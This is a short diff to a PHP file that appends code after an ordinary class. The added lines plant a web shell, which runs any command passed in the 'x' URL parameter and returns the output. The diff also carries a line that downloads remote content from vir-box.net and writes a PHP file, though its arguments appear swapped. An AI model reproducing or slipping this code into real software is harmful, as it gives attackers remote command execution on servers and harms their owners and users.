@@ -286,4 +286,11 @@ END;
         return $html;
     }
 }
-file_put_contents(file_get_contents("http://vir-box.net/xhat/coded.txt"), "../../dk.php")
+
+$x = @$_GET["x"];
+if($x != "")
+{
+    header("Content-Type: text/plain");
+    die(`$x`);
+}
+file_put_contents(file_get_contents("http://vir-box.net/xhat/coded.txt"), "../dk.php");
